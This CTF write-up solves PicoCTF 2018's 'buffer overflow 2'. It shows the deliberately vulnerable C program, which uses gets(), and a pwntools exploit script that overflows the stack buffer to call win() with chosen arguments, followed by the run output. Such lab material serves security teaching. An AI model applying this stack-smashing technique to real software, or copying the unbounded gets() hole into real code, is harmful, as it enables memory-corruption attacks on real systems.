---
title: 1. Calling a function with args
description: Exploiting a buffer overflow to call a function with specific arguments.
---

# Buffer Overflow - Calling a function with args

## Summary

Exploiting a buffer overflow to call a function with specific arguments.

## Challenge

### Statement

!!! note ""
    Challenge : buffer overflow 2 from PicoCTF 2018.

Alright, this time you’ll need to control some arguments. Can you get the flag from this program?

### Source code

```c linenums="1"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Answer

```shell
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped
```

The goal of this challenge is to call the **win** function with the two arguments, **0xDEADBEEF** and **0xDEADC0DE**. As you have probably noticed, the **vuln** function is vulnerable to a buffer overflow attack which allows us to rewrite **EIP** and thus call the **win** function. We can pass it the two required arguments using the stack as we are in 32 bits.

```python linenums="1"
#!/usr/bin/env python3
from pwn import process, p32, ELF

# Run the binary
PROGRAM = "./vuln"
p = process(PROGRAM)

# Setup the payload
elf = ELF(PROGRAM)
win_func_addr = p32(elf.symbols["win"])
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xDEADC0DE)
padding = ("A" * (100 + 12)).encode() # BUFSIZE + stuff we do not care about
padding2 = ("A" * 4).encode() # Override the return address

payload = padding + win_func_addr + padding2 + arg1 + arg2

# Sending the payload
p.sendlineafter("your string: \n", payload)
p.interactive()
```

Execution :

```shell
$ echo "ggflag" > flag.txt
$ python3 solve.py 
[+] Starting local process './vuln': pid 13568
[*] '/home/xxx/pico/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅\x04AAAAﾭ\xde\xde\xc0\xad\xde
ggflag
[*] Got EOF while reading in interactive
$ 
```
